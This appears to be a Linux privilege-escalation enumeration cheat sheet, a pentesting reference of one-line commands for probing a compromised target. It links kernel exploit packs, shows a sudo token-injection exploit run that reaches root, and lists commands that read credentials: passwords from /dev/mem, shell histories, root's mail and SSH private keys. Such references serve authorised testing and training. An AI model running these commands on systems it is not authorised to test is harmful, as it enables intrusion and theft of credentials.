---
description: quick commands to enumerate the target system
---

# Enumeration

### system information <a id="first"></a>

#### What's the distribution type? What version?

#### `cat /etc/issue  cat /etc/*-release  cat /etc/lsb-release # Debian based  cat /etc/redhat-release # Redhat based`





#### What's the kernel version? Is it 64-bit?

#### `cat /proc/version  uname -a  uname -mrs  cat /proc/$$/status | grep "[UG]id"  rpm -q kernel  dmesg | grep Linux  ls /boot | grep vmlinuz-`





#### places to find kernel exploits:

[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)  
 [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)  
 [https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)  
 [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)



#### To extract all the vulnerable kernel versions from that web you can do:

#### `curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '`



#### Tools that could help searching for kernel exploits are:

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)  
 [https://github.com/jondonas/linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)  
 [http://www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)



## sudo\_inject

#### this has requirements, does'nt work all the time:\(

#### clone the repository and run the script: [sudo\_inject](https://github.com/nongiach/sudo_inject)  requirements:

#### `$ sudo whatever  [sudo] password for user:  # Press+c since you don't have the password.  # This creates an invalid sudo tokens.  $ sh exploit.sh  .... wait 1 seconds  $ sudo -i # no password required :)  # id  uid=0(root) gid=0(root) groups=0(root)`



#### What can be learnt from the environmental variables?

#### `cat /etc/profile  cat /home/*/.bashrc | grep alias | grep -v "#"  cat /root/.bashrc | grep alias | grep -v "#"  cat ~/.bash_profile  cat ~/.bashrc  cat ~/.bash_logout  env  set`

#### in-memory password

#### `strings /dev/mem -n10 | grep -i PASS`

#### driver info

#### `lsmod  /sbin/modinfo [lib]  ls /dev 2>/dev/null | grep -i "sd"  cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null   #Check if credentials in fstab  grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null`



#### available shells

#### `cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null`

#### available programming languages

#### ``progr_dev=( "which perl" "which gcc" "which g++" "which python" "which php" "which cc" "which go" "which node") ;for programming_lang in "${progr_dev[@]}"; do pss=`$programming_lang |cut -d"/" -f4` ;if [ "$pss" ]; then echo -e "$pss" ;fi done``

####   check emails

#### `mail && ls -alh /var/mail/`    Is there a printer?

####  `lpstat -a`

####  What other users & hosts are communicating with the system? 

####  `lsof -i  lsof -i :80  grep 80 /etc/services  netstat -antup  netstat -antpx  netstat -tulpn  chkconfig --list  chkconfig --list | grep 3:on  last  w  cat /etc/sudoers`

####  How can files be uploaded? 

####  `find / -name wget  find / -name nc*  find / -name netcat*  find / -name tftp*  find / -name ftp`

## users and accounts

####   check for sudo access 

####  `sudo -l |grep vim  sudo -l |grep nmap  sudo -l |grep vi  sudo -l`

####  users UID and GID

####  `for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done`

 

#### users with UID 0 \(root\) accounts

#### `cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":"|awk '{print $1}'`

####  users readable history file 

####  `find /home/* -name *.*history* -print 2> /dev/null`

####  check history 

####  `cat ~/.bash_history  cat ~/.nano_history  cat ~/.atftp_history  cat ~/.mysql_history  cat ~/.php_history`   

####  user info 

####  `cat ~/.bashrc  cat ~/.profile  cat /var/mail/root  cat /var/spool/mail/root` 



## Possible defenses

  
 AppArmor

####  ``if [ `which aa-status 2>/dev/null` ]; then  aa-status  elif [ `which apparmor_status 2>/dev/null` ]; then  apparmor_status  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then  ls -d /etc/apparmor*  else  echo "Not found AppArmor"  fi``   

 Grsecurity

####  `((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")`

  
  
  
 PaX

####  `(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")`

  
  
  
 Execshield

####  `(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")`

  
  
  
 SElinux

####  `(sestatus 2>/dev/null || echo "Not found sestatus")`

  
  
  
 ASLR

####  `cat /proc/sys/kernel/randomize_va_space 2>/dev/null  #If 0, not enabled`



## network

####   What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?

####  `cat /etc/resolv.conf  cat /etc/sysconfig/network  cat /etc/networks  iptables -L  hostname  dnsdomainname`

####  network status 

####  `ss -anp  netstat -ano  /sbin/ifconfig -a  cat /etc/network/interfaces  cat /etc/sysconfig/network  arp -e  route  /sbin/route -nee`

####  Is packet sniffing possible? What can be seen? Listen to live traffic 

####  `tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21`

####  firewall rules 

####  `/etc/iptables  iptables -L  grep -Hs iptables /etc/*`

####  hosts and DNS

####  `cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'`

####   ssh root login status

####  `cat /etc/ssh/sshd_config | grep PermitRootLogin | grep -v "#"`

####   ssh info

####  `cat ~/.ssh/identity.pub ~/.ssh/authorized_keys ~/.ssh/identity ~/.ssh/id_rsa.pub ~/.ssh/id_rsa ~/.ssh/id_dsa.pub ~/.ssh/id_dsa /etc/ssh/ssh_config /etc/ssh/sshd_config /etc/ssh/ssh_host_dsa_key.pub /etc/ssh/ssh_host_dsa_key /etc/ssh/ssh_host_rsa_key.pub /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_key.pub /etc/ssh/ssh_host_key 2>/dev/null`



















